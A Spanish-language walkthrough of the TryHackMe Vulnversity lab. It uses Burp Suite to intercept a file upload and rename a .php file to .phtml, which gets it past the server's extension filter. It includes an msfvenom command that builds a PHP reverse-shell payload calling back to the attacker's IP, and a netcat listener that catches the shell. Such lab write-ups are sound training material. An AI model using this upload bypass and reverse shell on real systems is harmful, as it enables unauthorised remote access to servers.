# Burp Suite – Modificar Peticiones HTTP

Maquinas a utilizar **Kali Linux y Laboratorio de Try Hack Me  Vulnversity** [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

 

Vamos a aprender a **utilizar burp suite**, el cual consiste en una herramienta enfocada al hacking web que actúa como proxy entre el navegador y el servidor web, de tal forma que podremos interceptar las peticiones y realizar distintos tipos de ataques.

Escribimos en el navegador web la siguiente URL cambiando por supuesto la IP por la que corresponda en ese momento a la maquina victima.

`http://10.10.93.207:3333/internal/`

![image.png](./imagenes/image%2097.png)

Vemos que desde aquí podemos subir archivos. Como ya vimos con anterioridad para subir un archivo con extensión PHP tuvimos que cambiarle la extensión ya que PHP no estaba permitida. Ahora aprenderemos otro forma de hacerlo sin cambiar la extensión del archivo utilizando BurpSuite para interceptar la petición y modificar lo que queramos.

- Vamos a aplicar antes de nada un pequeño ajuste dentro del navegador web.
    
    **Ajustes → Settings**
    
    ![image.png](./imagenes/image%2098.png)
    

**General→ Network Settings**

![image.png](./imagenes/image%2099.png)

**Manual proxy configuration**

**HTTP Proxy: 127.0.0.1  Port: 8080**

![image.png](./imagenes/image%20100.png)

- Nos creamos un archivo malicioso con extensión PHP
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned2.php 
    ```
    
    ![image.png](./imagenes/image%20101.png)
    

- En **BurpSuite** nos vamos a la **pestaña Proxy** y pulsamos **intercept on** para activarla.
    
    ![image.png](./imagenes/image%20102.png)
    

- Vamos a intentar subir el archivo malicioso PHP.
    
    ![image.png](./imagenes/image%20103.png)
    

- Nos salta BurpSuite y nos muestra la petición interceptada (esta petición nunca a llegado al servidor BurpSuite la tiene retenida) y yo puedo cambiar lo que me interese de ella.
    
    ![image.png](./imagenes/image%20104.png)
    

A mi me interesa cambiar el nombre del archivo en la petición de extensión PHP.

![image.png](./imagenes/image%20105.png)

 a extensión **PHTML** para que crea que tiene una extensión que en realidad no la tiene.

![image.png](./imagenes/image%20106.png)

- Pulsamos **Forward** para dejar seguir la petición que hemos modificado.
    
    ![image.png](./imagenes/image%20107.png)
    

Vemos que se a subido correctamente  a pesar de ser un archivo con extensión php.

![image.png](./imagenes/image%20108.png)

- Desconectamos la interceptación en BurpSuite y volvemos a dejar como estaban los ajustes de navegador web.
    
    ![image.png](./imagenes/image%20109.png)
    
    ![image.png](./imagenes/image%20110.png)
    

- Nos vamos a la ruta donde se encuentran los archivos subidos. Y vemos que ya tenemos el archivo en el servidor. `http://10.10.58.163:3333/internal/uploads/`
    
    ![image.png](./imagenes/image%20111.png)
    

Vemos que aquí no muestra como php si no como phtml , esto es por que el cree que es phtml.

- Nos ponemos a la escucha con netcat.
    
    ```bash
    nc -nlvp 443
    ```
    
    ![image.png](./imagenes/image%20112.png)
    

- Ejecutamos el archivo malicioso y recibimos la conexión y nos encontramos dentro de la maquina. Pero esta vez utilizando BuspSuite. Recordemos que intentemos estabilizar la conexión ya que msfvomon es muy inestable.
    
    ![image.png](./imagenes/image%20113.png)